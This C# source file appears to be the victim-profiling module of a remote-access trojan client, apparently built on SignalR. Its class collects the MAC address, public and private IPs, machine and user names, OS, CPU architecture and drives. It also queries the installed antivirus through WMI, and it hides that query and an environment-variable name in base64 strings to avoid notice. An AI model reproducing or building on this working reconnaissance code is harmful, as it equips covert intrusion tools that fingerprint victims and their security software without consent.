using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Text;

namespace SignalRClient1
{
    public class InitialDataModel
    {
        public string MAK { get; set; }
        public string PubIp { get; set; }
        public string PriIp { get; set; }
        public string CmpName { get; set; }
        public string UserName { get; set; }
        public string AV { get; set; }
        public string OSys { get; set; }
        public string CArch { get; set; }

        public DriveInfo[] Drives { get; set; }

        public InitialDataModel()
        {
            MAK = GetMAK();
            PubIp = GetPublicIp();
            PriIp = GetPrivateIP();
            CmpName = Environment.MachineName;
            UserName = Environment.UserName;
            AV = GetAV();
            OSys = Environment.OSVersion.ToString();
            CArch = GetCArch();
            Drives = DriveInfo.GetDrives();
        }


        private string GetMAK()
        {
            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
            String mak = string.Empty;
            foreach (NetworkInterface adapter in nics)
            {
                if (adapter.OperationalStatus == OperationalStatus.Up)
                {
                    if (mak == String.Empty)
                    {
                        IPInterfaceProperties properties = adapter.GetIPProperties();
                        mak = adapter.GetPhysicalAddress().ToString();
                    }
                }
            }
            return mak;
        }

        private string GetAV()
        {
            string scope = Encoding.UTF8.GetString(Convert.FromBase64String("cm9vdFxTZWN1cml0eUNlbnRlcjI="));
            string qs = Encoding.UTF8.GetString(Convert.FromBase64String("U0VMRUNUICogRlJPTSBBbnRpVmlydXNQcm9kdWN0"));
            // SELECT * FROM AntiVirusProduct
            // SELECT * FROM FirewallProduct
            // SELECT * FROM AntiSpywareProduct
            ManagementObjectSearcher wmiData = new ManagementObjectSearcher(scope, qs);
            ManagementObjectCollection data = wmiData.Get();
            string avName = string.Empty;
            foreach (ManagementObject vChecker in data)
            {
                if (avName == null || avName == "")
                {
                    avName = (vChecker["displayName"].ToString());
                }
                else
                {
                    avName = avName + "|" + (vChecker["displayName"].ToString());
                }
            }
            return avName;
        }

        private string GetCArch()
        {
            string arc = Encoding.UTF8.GetString(Convert.FromBase64String("UFJPQ0VTU09SX0FSQ0hJVEVDVFVSRQ=="));
            return Environment.GetEnvironmentVariable(arc);
        }

        private string GetPrivateIP() =>
            Dns.GetHostAddresses(Dns.GetHostName()).ToArray().Where(ip => ip.AddressFamily == AddressFamily.InterNetwork).FirstOrDefault().ToString();
        private string GetPublicIp()
        {
            try
            {
                var response = new HttpClient().GetStringAsync("http://checkip.dyndns.org").Result;
                string[] ipAddressWithText = response.Split(':');
                string ipAddressWithHTMLEnd = ipAddressWithText[1].Substring(1);
                string[] ipAddress = ipAddressWithHTMLEnd.Split('<');
                return ipAddress[0];
            }
            catch (Exception)
            {
                return null;
            }
        }


    }
}
